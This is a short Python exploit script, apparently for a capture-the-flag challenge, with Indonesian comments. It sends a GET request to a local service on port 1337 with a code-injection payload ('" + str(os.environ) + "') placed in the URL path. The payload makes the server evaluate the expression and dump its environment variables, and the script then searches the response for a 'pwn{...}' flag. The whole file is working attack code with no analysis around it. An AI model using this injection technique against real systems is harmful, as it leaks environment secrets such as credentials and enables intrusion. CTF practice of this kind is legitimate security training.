import requests
import re
import urllib.parse

# Port 1337
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Payload: " + str(os.environ) + "
    # Kita pake urllib.parse.quote buat pastiin karakter aneh aman di URL path
    raw_payload = '" + str(os.environ) + "'
    
    # Encode payload biar aman di URL
    # safe='' biar tanda plus (+) juga ke-encode kalau perlu, 
    # tapi requests biasanya pinter. Kita coba raw string dulu.
    
    # Path Injection
    target_url = f"{URL}/{raw_payload}"
    print(f"[*] Sending Payload to Path: {target_url}")
    
    try:
        # Kirim GET request
        r = requests.get(target_url)
        
        if r.status_code == 200:
            print("[+] Injection Successful!")
            
            # Cari Flag
            flag = re.search(r'pwn\{.*?\}', r.text)
            
            if flag:
                print(f"\n[!!!] FLAG FOUND IN ENV: {flag.group(0)}\n")
            else:
                print("[-] Flag regex failed. Response dump:")
                print(r.text[:500])
        else:
            print(f"[-] Failed. Status: {r.status_code}")
            # print(r.text) # Debug kalau 500 error

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
